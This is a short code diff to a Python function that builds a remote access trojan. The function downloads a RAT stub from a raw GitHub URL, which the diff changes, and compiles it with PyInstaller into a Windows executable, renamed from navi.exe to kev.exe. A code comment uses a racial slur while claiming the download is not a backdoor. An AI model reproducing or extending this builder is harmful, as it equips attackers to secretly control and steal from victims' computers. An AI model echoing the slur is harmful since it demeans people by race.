@@ -27,7 +27,7 @@ def rat_builder_init():
         try:
             import urllib.request
             os.makedirs(os.path.dirname(stub_template), exist_ok=True)
-            url = "https://raw.githubusercontent.com/glockinhand/glockinhand/refs/heads/main/rat_stub.txt" # this is not a backdoor niggers its just the template for rat builder
+            url = "https://raw.githubusercontent.com/ns-demon/navi-multitool/refs/heads/main/modules/stub/rat_stub.txt" # this is not a backdoor niggers its just the template for rat builder
             urllib.request.urlretrieve(url, stub_template)
             print(Colorate.Horizontal(_cl["head"], "  [+] File downloaded successfully."))
         except Exception as e:
@@ -75,7 +75,7 @@ def rat_builder_init():
             "--distpath", output_dir,
             "--workpath", "build",
             "--specpath", "build",
-            "--name", "navi",
+            "--name", "kev",
             temp_stub
         ]
 
@@ -83,7 +83,7 @@ def rat_builder_init():
 
         if process.returncode == 0:
             print(Colorate.Horizontal(_cl["head"], f"  [+] Build successful! All modules packed."))
-            print(Colorate.Horizontal(_cl["head"], f"  [+] EXE located in: {output_dir}/navi.exe"))
+            print(Colorate.Horizontal(_cl["head"], f"  [+] EXE located in: {output_dir}/kev.exe"))
         else:
             print(Colorate.Horizontal(_cl["num"], "  [-] Build failed! Detailed PyInstaller Errors:"))
             print(process.stderr)
